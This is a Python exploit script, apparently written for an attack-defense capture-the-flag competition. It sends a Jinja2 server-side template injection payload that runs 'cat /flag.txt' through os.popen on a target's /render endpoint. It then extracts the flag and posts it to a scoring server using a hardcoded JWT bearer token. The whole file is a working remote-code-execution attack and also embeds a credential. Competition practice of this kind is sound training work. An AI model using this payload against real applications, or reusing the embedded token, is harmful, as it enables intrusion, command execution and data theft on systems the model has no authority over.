#!/usr/bin/env python3

import requests
import sys
import re

host = sys.argv[1]

SYSTEM_URL = 'http://13.212.152.221:5000/api/flag'
SYSTEM_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyNDIwNjIyOSwianRpIjoiNzliNmQwYWMtMDZlNS00NTliLWE4ZjAtMGM5MjYxNjllM2Q4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ1c2VybmFtZSI6IkdpcmxzIEJhbmQgQ3J5In0sIm5iZiI6MTcyNDIwNjIyOSwiY3NyZiI6ImRjY2NhZjM3LTgyMDYtNDI1Ny04MThmLTBjZDg3MDgwYTU4NiIsImV4cCI6MTcyNDI5MjYyOX0.hPz00_Z06cWm0VtzpjZgvjdor4n78vzqmTT3ouMsIIM'
token = "Bearer " + SYSTEM_TOKEN

try:
    r = requests.get("http://" + host + ":12000/render?name={{lipsum.__globals__.os.popen(%27cat%20/flag.txt%27).read()}}")
    base64_string = re.search(r'WreckIT50\{([^}]+)\}', r.text).group(1)
except:
    exit(1)

r = requests.post(SYSTEM_URL,
                        headers={
                            'Authorization': token,
                            'Content-Type': 'application/json'
                            },
                        json={
                                'flag': base64_string
                        })
print(base64_string, flush=True)
print(r.json())